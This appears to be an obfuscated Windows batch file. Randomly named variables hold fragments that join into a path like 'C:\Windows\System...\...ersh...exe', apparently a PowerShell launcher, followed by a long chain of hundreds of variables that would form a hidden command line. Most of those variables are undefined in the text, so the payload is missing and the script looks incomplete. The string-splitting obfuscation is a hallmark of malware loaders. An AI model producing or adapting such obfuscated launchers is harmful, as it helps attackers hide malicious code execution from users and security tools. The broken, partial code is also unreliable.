@echo off
!YUIHJZALwOHQtSKjodAY! "UXfGnDRNMu=exe""
!YUIHJZALwOHQtSKjodAY! "PSpsbWwhAh= "
!YUIHJZALwOHQtSKjodAY! "IcgXtyXMtb=dows"
!YUIHJZALwOHQtSKjodAY! "YbXGswNXXh="%systemdrive%"
!YUIHJZALwOHQtSKjodAY! "AeUhqtvFMd=ersh"
!YUIHJZALwOHQtSKjodAY! "xhJHnInSYh=\Sys"
!YUIHJZALwOHQtSKjodAY! "ZHmNMUSHDc=\Win"
%YbXGswNXXh%%ZHmNMUSHDc%%IcgXtyXMtb%%xhJHnInSYh%%ZOivtYVOVh%%cgPQXWUZnU%%yaDVJSXEze%%HaJvcTTLDv%%DjRlYrrTKr%%NnEdJZlmLB%%aqpRAcxuNd%%djwRrojsXs%%AeUhqtvFMd%%IGZcumTaKW%%UXfGnDRNMu%%PSpsbWwhAh%%gNPDYCWnMS%%WpHEoBcfnx%%BgrqXOJsIJ%%QYXhisoHVX%%IPXszNbhYv%%myihfZwzGj%%SDFccYszwW%%mukqOMiYRk%%NBunxrPPbi%%WPbLefjVqA%%vCLciRnStt%%RxHvwrjrFK%%iCxnZxsylJ%%CnIqPlPrfF%%dWwIryhGpN%%VRpFrSeycK%%zPHJQDPqGk%%BSmaGmgPVA%%pMiyOKXcZW%%grougopMRN%%JRZeldFpZf%%LpDCuMGjVg%%GNrJekDRUr%%XtXhRyNdnK%%fHcTkROMat%%IgRLhWzpaa%%zNvHisrvLV%%ZCWkbYKxym%%wRRAJRCmaV%%YxdmlrmvLS%%zsbfufjGKi%%lbROEIWUXr%%PfvQWBzJZJ%%LpMFMeQLgD%%HWCRJXGpIC%%usxtduXliT%%GAGaxVplbA%%RkOtKSDEgZ%%VkbwptSsBs%%hFDnXgqBuN%%HvniKjDdJl%%QseiYwyjLd%%dWJItmHBwD%%CbjsrzWTMf%%POIqBOAupB%%IgQqKLMEPy%%CcGgJOiLRy%%zExFnonshE%%MmmVUvlTIG%%NreoCNhCHM%%FODQbdJkdv%%xtxkMqQLmn%%DpdlKiAjdA%%gLLuZXIvUR%%MaPmiuTUCm%%WwpujpLsgS%%DAhCoMHdlO%%HuRvADzQcq%%pFGQDKvrlJ%%mqpbnmSnYv%%MPJNFCFUTF%%PUpPDXTqYE%%qqSBCqfPho%%KmSHDzWTlb%%eAyFTrbzyq%%sBotfvWhlo%%xPNEUDbIld%%aafXzPSnHk%%pFqRVjXzBi%%COIXEoNTKq%%psnupswrTp%%CJAaYRzVIL%%FCgdBmshsk%%cZCrVXrWBD%%MGFmFSoIYM%%PRkZKMljTd%%aoYInDhieb%%ACtfYZXUyI%%XJjGukOCHi%%LhcyCyIWZb%%LgDXmnxebL%%OrLlfqfroc%%PFBWqsAVDA%%rbUxXRglth%%MJBWttwRsl%%sqIWmfEHGU%%NCBAtNxooo%%kTYgqfdECX%%VICrhatYlR%%mzEzujhaCG%%ViCebzsBFg%%caeJYeaktt%%uydxbKoyLg%%XdcWbNfxpI%%IRsePmuVBq%%jWHjlwffcr%%kTPziYXiIk%%YCVLKCgYIP%%qtXvXavTKE%%IavYxPbTVQ%%ommqrGbWyI%%qgxmaQWuBi%%CexeCYhXnV%%BndRAegGer%%ZzucnBCiXG%%SHsNnkOiOt%%zdIDhddFMW%%KqqkidKvQa%%vZaGcUVpEq%%pYSLSVQQUk%%yWwaWCrhEk%%zssNXzdcAn%%hNavHMyFsm%%mTAFCyCZJA%%DNKuRWFeNs%%SOqHdKWbtk%%eMPrXFSMly%%XdsaJucGDK%%gtRauyDTCR%%CBGzwRXtxl%%eSTpuOvpXI%%IpxJdKUPXz%%cYktVvxTDS%%wJjsFnABFG%%cnVTjmeWwM%%WivXifIAuZ%%qCMemYgedP%%ktkqwOdrjI%%qAwRWonljz%%FZhFpABQHl%%fZTGBCXfBu%%crqLJPfUiX%%KVVDkkmFbW%%mmJYCrHQqu%%riJPxnJvWz%%uHIJAkeqvq%%qseFhPHsjs%%ioEOGBlggW%%BQJBBFEays%%mrvZdYeeHH%%GrmErgcUdY%%YXjyPzJCeB%%lHUQfRTFKH%%xhyyqkEfku%%DJWztohXjD%%pBagvYxvyz%%mxjvBRzLhE%%VEsJYCKuxQ%%KWvhrVgscr%%NiGKifzBYC%%PvPEHLjrhT%%ocYIOqbceF%%LgIPRMXHBS%%cjwVaogQzG%%MOkidKkXVR%%dxwsRIMZNU%%NBQpRfGdHA%%klDyTWWzMg%%CaMJOFMeds%%CgdESlYVrY%%ehqvGSTYyU%%MmnGsNPgAm%%sBZpXdhZFI%%XbiObvKqdV%%LNFiFpTxle%%vRufFChaxD%%LUtPXLeyEW%%dydFAEWQJI%%jKNAmfHdiz%%nJSzkRuPlU%%kuSobWOOEa%%GrqPtagSCR%%dbpfJtGDvI%%kgEOxORyzp%%rSyhSWsdgj%%LCmuQjfNFH%%qktWQAMCrE%%jHtnAlChmM%%bDwlXHTkYo%%JdTRZgyCrs%%kQLCZdjZUF%%GXBTGMOhYi%%GBDcUfOBnt%%NaQTCkRTlT%%yTqsHMCZkn%%sqDiLImIIU%%pHMASGgHqw%%UUWfKNlkvh%%COqabwwHhT%%XjlrEQgQAa%%GVJOsyuyyY%%xbnArAqMzv%%jyzwyLIEAT%%GuKuBGfCHD%%bYjjwVVKZe%%AuqfRhwmqH%%PPYEscrSZL%%uOfWtlpqaC%%PXFwtmdEDu%%kTmaNmaEQt%%EdLoJLouLF%%RglNRRkBlg%%YMoEABCfih%%lKzGYMlrMH%%XJTXCeHyiV%%bysKvROgNi%%jjlDuhGFPf%%FTPEjpTrcw%%TeWmfNrOlg%%XfDDxNxqDv%%xcIcpiIOBf%%XxerpfmZxH%%PSuIhAplgv%%SDNHYRvUXX%%eDnfjAalos%%AySWFFHZUO%%SwHfnuKxtx%%JsbAClEozH%%AeXOVtKRbt%%jvZieHWhRO%%QDSRIhwstt%%atAmoOzSkU%%JSvZnnsTvV%%pwxLRWlggN%%XsxHsQVMTp%%idXXeXiSDu%%OCWyeDVOvr%%DsLxWqvNHx%%rGafMlzzGU%%OsDMYuwZDO%%UhrBMPsAaN%%CulfciCQLS%%ewiBCkPZyB%%UvjTCkpytX%%TZySrthxKP%%SFoLJyYPZB%%ZsbzThlrCR%%TexNYeXqjj%%cspJJpgyje%%mzzRXAXZYk%%iQUSWOiAME%%AHGPyHdsPD%%aMiyEuFFQy%%hXrYamxwMV%%hGLEDFTJsq%%xFjvkvHwoC%%iCKoxCpHPl%%jHFUwuaDUZ%%BWmzaBOWOE%%FbikMEVxga%%plTggPZpYQ%%udBoamqknW%%OtSkGhyuiS%%yDxTJpcfsk%%BzXYkBATjz%%nKkjmWtIAY%%qFggrRGHFL%%klScvpvUaf%%HFkIEOtnHM%%VtFtUWsRHs%%VSoypcShOX%%BzIurLuyBC%%ysaSPQFyiy%%WDmHkPrMtC%%WlyKlwKkci%%BUpeUCSvIy%%wtZpaXmbkB%%uHfZGmTpHt%%fvvZWcniMI%%XWeUfCmiKn%%kJaBOUPqxI%%ICNosbYZtX%%JdoCExDkTe%%ZLFujwuUlc%%nXLdZuiPCe%%DnPMDgvyWq%%rExtIXWsfW%%HeNqKMskCj%%oNIPAMVSQc%%bWXUKJzrvc%%xQJFxyzycQ%%NkWNbDWHSV%%beBdVKhTFa%%naPzLydcsc%%nwQaoQZjTg%%MRzzatoGKM%%rGSbDNvwbC%%ATpQIFnBOe%%KYZynvApzs%%kxsGKHDOwB%%uDhqGTCJRv%%fMRFbtGuNi%%mfWJscBJfb%%bzenJhQJSu%%TRydmxGMFr%%ajaoppHyXE%%sTEPtGIDVU%%DWCtpvHSxV%%wPeNaRyQYu%%zrMncamIKF%%PcQKOeHHZT%%HOachCPRPB%%iRFAulkoqo%%iYiRftYtZW%%kQQeNLqJfz%%lvSixXxqqC%%TtrKLIFiWO%%EvRTrraANI%%UAiRdNgaui%%WIcwcRzgte%%fhNrUPDZQf%%XWCHIskzGX%%CFOORWtvRA%%SUhIDMNQWo%%jgjplafuNJ%%GZzvBAtZAY%%vhiqmcOTeV%%FuDsNvvyDQ%%QYHhTSuLhc%%tNqXScYTci%%lmpSdmwhHf%%eVwJiwzawu%%IdMbCRdFzL%%xBvuFEIPdH%%wmebXxrGPw%%CXxIAizoql%%iQIVIDzbeD%%NKXOXvYLee%%AxQdizeNUw%%euzRzGEitu%%YqClISaIKf%%jOklLKZFNi%%yMhHytkfor%%QQsJfkVEuq%%zvcPmqknfO%%GZvkVmiUNp%%HUtsotwAgB%%PvkwIcJrui%%iXZALRvhNT%%baRfIEcJAT%%TKhEZkOYCT%%CRzEhKVTHw%%YpNmAOEfNd%%aZQBpyQvBA%%dwFUqkBnYY%%JicdVEXVdk%%GJkySDaYoJ%%TAshtBKSVq%%nrgPuSXNFK%%AVrqUtmgcN%%kDYpejQUJu%%UeZNXpCvda%%GmsEiYjbna%%oDQifJtRKl%%bcdlQwVDtF%%QRdbhXkuhg%%ZPHJfrnRHn%%VLKSYDjgNL%%cFHIjxzObi%%zZJEllutgz%%ieVgJfgldD%%NdGvduiZAH%%RzQzNWbgGM%%iQaoCYKAYe%%roLxvvsnAR%%dvTyHJnwtM%%dZEquXcsTe%%JIavpCNses%%DOGPJNWCGT%%KohmasKvdx%%sauwhvvxje%%VVraiptOGH%%aALatvBNvX%%SspGaDtjHo%%rztBXPWgdL%%ZVOwxRoucM%%UHclmDGLaF%%VjgspAhkdD%%yuKJYWDSji%%pZhVuKxhot%%jlgyPPOwhW%%JerynzWsnq%%aNCRpWblYE%%daVJunnmUi%%hgLmzkIIHU%%NfTYswIpiS%%NDyCSJiHea%%mKxfiTbpsf%%otEdRYhWrX%%EYebuEIitQ%%cbEGHdHOPz%%utXdDuYuLU%%ClqgwoGvKE%%lTWBcnOXwN%%rshRDlaaxZ%%FnxyoQKxkt%%wldlnBwvaq%%GbYXDjeyCl%%nFYLYXvxnm%%CqNcrfpWDc%%OFahtEoAVe%%LmVZfRnsmp%%fZhNNpnWGx%%UiUAwIFQru%%JVBjBpvOXA%%SWKnWPxntd%%qsTxkCsuCw%%lwaRGkxYmx%%UzYfFXyGDH%%lswodqbeYY%%XalAovVSHM%%ryaWjRtNRm%%eMRVlTaMOp%%isZnATnyRk%%bGYRpMrAel%%WnmLTljqou%%vjerDYyNvp%%DVWHlyNZFz%%CzHCtVgoto%%KXjwOSBHnq%%nDePIbrFAv%%yjKPRVBCYI%%SkthFGLzTs%%WfMplYvSUr%%DBNYQAnuES%%qZJFxckXkb%%pRMhzsxuDT%%AIHGerxvqe%%srUabWwgRi%%OyISbMOFzy%%dSQLsIrcAf%%FPGfIYXLgC%%WqDufcZPEs%%CRWSaABiHt%%EuGLDZRCjd%%OdzWBMpvGq%%ICxhDOSOfi%%wOeMXBJRRf%%lxFBDzrZqn%%lfCrLcXyiO%%gcxbGaYNZa%%dxDAflWWEd%%wTxRXrlNbU%%ElIcZiZEUC%%BEZqkNBblA%%gaUfsmEFep%%OlMevRPBAW%%lsbbCRThHj%%PjBAODqDKM%%DuzENqSUVs%%YaAooOZTDA%%txYUAEJlqR%%AlQOtQSxnl%%ZYmolOImma%
!YUIHJZALwOHQtSKjodAY! "ADocqvkQtx=exit"
!YUIHJZALwOHQtSKjodAY! "pIZHloTyYi= /b"
%ADocqvkQtx%%pIZHloTyYi%
